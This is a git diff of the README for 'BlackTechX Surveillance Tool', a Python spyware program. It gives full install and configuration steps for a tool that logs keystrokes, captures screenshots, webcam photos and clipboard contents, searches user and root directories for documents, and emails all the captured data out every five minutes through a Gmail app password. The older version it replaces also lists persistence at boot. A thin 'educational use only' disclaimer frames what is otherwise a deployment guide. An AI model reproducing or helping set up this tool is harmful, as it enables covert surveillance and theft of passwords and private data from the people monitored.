@@ -1,122 +1,251 @@
-#🛡️ BLACKTECHX – ADVANCED SPY TOOL
+  # BlackTechX Surveillance Tool                                        
 
-⚠️⚠️⚠️ DISCLAIMER – READ BEFORE USING ⚠️⚠️⚠️
+  [![Python](https://img.shields.io/badge/Python-3.8%2B-blue.svg)](https://python.org)
+  [![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-orange.svg)](https://github.com/yourusername/BlackTechX-Surveillance)
 
-🚨 THIS TOOL IS STRICTLY FOR EDUCATIONAL AND SECURITY RESEARCH PURPOSES ONLY 🚨
+  Simple surveillance tool with keylogging, screenshots, webcam
+  capture, and email reporting.
 
-⚡ AUTHORIZED USE ONLY:
+  ## ⚠ Legal Warning
+  For educational purposes and authorized security testing only. Do not
+  use for illegal activities.
 
-Learning security concepts
+  ## 🚀 Quick Installation
 
-Authorized penetration testing
+  ### 1. Install Python Dependencies
+  ```bash
+  pip install pynput colorama pyautogui pyperclip opencv-python
+  requests
 
-Cybersecurity research
+                        2. Get Gmail App Password
 
-❌ PROHIBITED:
+  1 Go to Google Account Settings
+  2 Go to Security → 2-Step Verification (enable if not already)
+  3 Go to App passwords (search for it)
+  4 Select Mail and generate 16-character password
+  5 Use this password in the tool (NOT your regular password)
 
-Unauthorized surveillance
+                       3. Configure Email Settings
 
-Spying on others
+  Edit spy_tool.py and change these lines:
 
-Data theft or privacy invasion
+  EMAIL_CONFIG = {
+      'sender_email': 'your_email@gmail.com',
+      'sender_password': 'your_16_char_app_password',
+      'recipient_email': 'your_email@gmail.com',
+      'email_interval': 300  # Send every 5 minutes
+  }
 
-⚠️ The author is NOT responsible for misuse. Use ethically.
+                             4. Run the Tool
 
-📸 FEATURES
-🔹 Core Surveillance
-
-Keylogging – Capture real‑time keystrokes
-
-Screenshots – Automatic capture at set intervals
-
-Webcam Capture – Periodic snapshots
-
-Clipboard Monitoring – Tracks copied text
-
-🔹 Advanced Intelligence
-
-System Info – Hardware & software details
-
-Network Info – IP addresses, interfaces
-
-File Discovery – Search for sensitive files
-
-Process Monitoring – Lists running processes
-
-🔹 Automated Reporting
-
-Email Auto-Sender – Compressed data packages
-
-Cross-Platform – Linux, Windows, macOS
-
-Persistence – Auto-start on boot
-
-UTM Optimized – Linux in UTM
-
-🚀 QUICK START
-
-1️⃣ Clone Repository
-
-git clone https://github.com/yourusername/BlackTechX-Spy-Tool.git
-cd BlackTechX-Spy-Tool
+  python spy_tool.py
 
 
-2️⃣ Install Dependencies
+                         📋 Complete Setup Guide
 
-pip install -r requirements.txt
+                           Linux Installation
+
+  # Update system
+  sudo apt update && sudo apt upgrade -y
+
+  # Install Python and pip
+  sudo apt install python3 python3-pip -y
+
+  # Install system dependencies
+  sudo apt install gnome-screenshot scrot imagemagick python3-opencv -y
+
+  # Install Python packages
+  pip3 install pynput colorama pyautogui pyperclip opencv-python
+  requests
+
+  # Clone and run
+  git clone https://github.com/yourusername/BlackTechX-Surveillance.git
+  cd BlackTechX-Surveillance
+  python3 spy_tool.py
+
+                          Windows Installation
+
+  # Install Python from python.org (check "Add to PATH")
+
+  # Open Command Prompt as Administrator
+  pip install pynput colorama pyautogui pyperclip opencv-python
+  requests
+
+  # Run the tool
+  python spy_tool.py
+
+                           macOS Installation
+
+  # Install Homebrew if not installed
+  /bin/bash -c "$(curl -fsSL
+  https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
+
+  # Install dependencies
+  brew install python3 opencv
+  pip3 install pynput colorama pyautogui pyperclip opencv-python
+  requests
+
+  # Run the tool
+  python3 spy_tool.py
+
+                       📧 Gmail Setup Instructions
+
+                 Step 1: Enable 2-Factor Authentication
+
+  1 Go to Google Account
+  2 Click Security
+  3 Under "Signing in to Google", click 2-Step Verification
+  4 Follow the setup process
+
+                       Step 2: Create App Password
+
+  1 After enabling 2FA, go back to Security page
+  2 Look for App passwords (you might need to search for it)
+  3 Select Select app → Mail
+  4 Select Select device → Other (Custom name)
+  5 Enter: BlackTechX Surveillance
+  6 Click Generate
+  7 Copy the 16-character password
+
+                         Step 3: Configure Tool
+
+  EMAIL_CONFIG = {
+      'smtp_server': 'smtp.gmail.com',
+      'smtp_port': 587,
+      'sender_email': 'your_email@gmail.com',
+      'sender_password': 'abcd efgh ijkl mnop',  # Your 16-char app
+  password
+      'recipient_email': 'your_email@gmail.com',
+      'email_interval': 300
+  }
+
+                               🎯 Features
+
+  • Keylogging: Records all keystrokes
+  • Screenshots: Takes screenshots every 60 seconds
+  • Webcam Capture: Takes photos from webcam every 5 minutes
+  • Clipboard Monitoring: Tracks copied text
+  • System Info: Collects system information
+  • Auto Email: Sends all data to your email every 5 minutes
+  • Cross-Platform: Works on Linux, Windows, macOS
 
 
-3️⃣ Configure Email
+                            🔧 Configuration
 
-EMAIL_CONFIG = {
-    'smtp_server': 'smtp.gmail.com',
-    'smtp_port': 587,
-    'sender_email': 'your_email@gmail.com',
-    'sender_password': 'your_app_password',  # Gmail App Password
-    'recipient_email': 'recipient_email@gmail.com',
-    'email_interval': 300
-}
+                    Change Data Collection Intervals
 
 
-4️⃣ Run the Tool
+  ADVANCED_CONFIG = {
+      'screenshot_interval': 60,      # Screenshots every 60 seconds
+      'webcam_interval': 300,         # Webcam every 5 minutes
+      'clipboard_monitor': True,      # Enable clipboard monitoring
+      'email_interval': 300           # Email every 5 minutes
+  }
 
-python spy_tool.py
+                     Change File Search Directories
 
-🔐 GMAIL APP PASSWORD SETUP (REQUIRED)
 
-1️⃣ Go to Google Account Settings
+  # For Linux
+  'search_directories': ['/home', '/root', '/tmp']
 
-2️⃣ Open Security
-3️⃣ Enable 2-Step Verification
-4️⃣ Go to App passwords → generate password for Mail
-5️⃣ Copy the 16-character password and use it in the script
+  # For Windows
+  'search_directories': ['C:\\', 'D:\\', 'C:\\Users']
 
-⚠️ Security Tip: Never upload your real credentials to GitHub.
+  # For macOS
+  'search_directories': ['/Users', '/Library', '/tmp']
 
-⚙️ CONFIGURATION OPTIONS
-ADVANCED_CONFIG = {
-    'screenshot_interval': 60,
-    'webcam_interval': 300,
-    'clipboard_monitor': True,
-    'email_interval': 300
-}
 
-📁 File Search
-file_extensions = ['.txt', '.doc', '.pdf', '.xls', '.csv', '.py', '.js']
+                            🛠 Troubleshooting
 
-# Linux / macOS
-search_directories = ['/home', '/Users']
+                            Permission Errors
 
-# Windows
-search_directories = ['C:\\', 'D:\\']
 
-🔧 SYSTEM REQUIREMENTS
+  # Linux/macOS - run with sudo if needed
+  sudo python3 spy_tool.py
 
-Python 3.8+
+  # Windows - run Command Prompt as Administrator
 
-Linux / Windows / macOS
 
-Admin/root access recommended
+                          Missing Dependencies
 
-Linux Dependencies
-sudo apt-get install gnome-screenshot scrot imagemagick python3-opencv
+
+  # Reinstall all dependencies
+  pip uninstall -y pynput colorama pyautogui pyperclip opencv-python
+  requests
+  pip install pynput colorama pyautogui pyperclip opencv-python
+  requests
+
+
+                            Screenshot Issues
+
+
+  # Linux - install screenshot tools
+  sudo apt install gnome-screenshot scrot imagemagick
+
+  # If still not working, tool will use pyautogui fallback
+
+
+                          Email Sending Issues
+
+  1 Check Gmail App Password is correct
+  2 Ensure 2-Factor Authentication is enabled
+  3 Check firewall allows SMTP connections
+  4 Try sending test email:
+
+  import smtplib
+  server = smtplib.SMTP('smtp.gmail.com', 587)
+  server.starttls()
+  server.login('your_email@gmail.com', 'your_app_password')
+  print("Email test successful!")
+  server.quit()
+
+
+                              Webcam Issues
+
+  • Most virtual machines don't have webcam access
+  • Tool will skip webcam capture if no camera detected
+  • No errors will be shown for missing webcam
+
+
+                            📁 Files Created
+
+  • keylog.txt - Keystroke logs
+  • clipboard_log.txt - Clipboard content
+  • system_info.txt - System information
+  • screenshots/ - Screenshot images
+  • webcam_captures/ - Webcam images
+  • spy_data/ - Encrypted data packages
+
+
+                         ⚡ Quick Start Commands
+
+
+  # 1. Install everything (Linux)
+  sudo apt update && sudo apt install python3 python3-pip
+  gnome-screenshot scrot imagemagick -y
+  pip3 install pynput colorama pyautogui pyperclip opencv-python
+  requests
+
+  # 2. Configure Gmail App Password (see instructions above)
+
+  # 3. Edit email settings in spy_tool.py
+
+  # 4. Run
+  python3 spy_tool.py
+
+  # 5. Press Ctrl+C to stop
+
+
+                               📞 Support
+
+  If you have issues:
+
+  1 Check the troubleshooting section above
+  2 Ensure all dependencies are installed
+  3 Verify Gmail App Password is correct
+  4 Check system permissions
+
+ ───────────────────────────────────────────────────────────────────────
+ Note: This tool automatically sends collected data to your email
+ address every 5 minutes. Make sure your email configuration is correct
+ before running.
